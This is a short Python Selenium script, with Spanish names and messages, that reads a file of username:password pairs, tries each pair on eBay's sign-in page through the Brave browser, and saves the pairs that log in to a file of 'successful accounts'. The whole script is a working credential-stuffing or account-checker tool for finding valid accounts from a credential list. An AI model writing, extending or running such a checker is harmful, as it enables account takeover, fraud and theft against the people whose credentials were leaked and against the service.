from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

brave_path = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"

options = webdriver.ChromeOptions()
options.binary_location = brave_path
options.add_argument("--start-maximized")

webdriver_path = r"C:\Users\Administrator\Desktop\bot spectrum\chromedriver.exe"
service = Service(webdriver_path)

with open(r"C:\Users\Administrator\Desktop\bot spectrum\Cuentas.txt", "r") as f:
    cuentas = [line.strip() for line in f.readlines()]

cuentas_exitosas = []

for cuenta in cuentas:
    user, password = cuenta.split(":")

    driver = webdriver.Chrome(service=service, options=options)
    driver.get("https://www.ebay.com/signin")

    try:
        time.sleep(3)

        user_field = driver.find_element(By.ID, "userid")
        user_field.send_keys(user)
        user_field.send_keys(Keys.RETURN)

        time.sleep(3)

        pass_field = driver.find_element(By.ID, "pass")
        pass_field.send_keys(password)
        pass_field.send_keys(Keys.RETURN)

        time.sleep(5)

        if "myebay" in driver.current_url or "summary" in driver.current_url:
            cuentas_exitosas.append(cuenta)

        driver.get("https://www.ebay.com/logout")
        time.sleep(3)

    except Exception as e:
        print(f"Error con la cuenta {user}: {e}")

    finally:
        driver.quit()

with open(r"C:\Users\Administrator\Desktop\bot spectrum\cuentas_exitosas.txt", "w") as f:
    for cuenta in cuentas_exitosas:
        f.write(cuenta + "\n")

print("Proceso completado.")
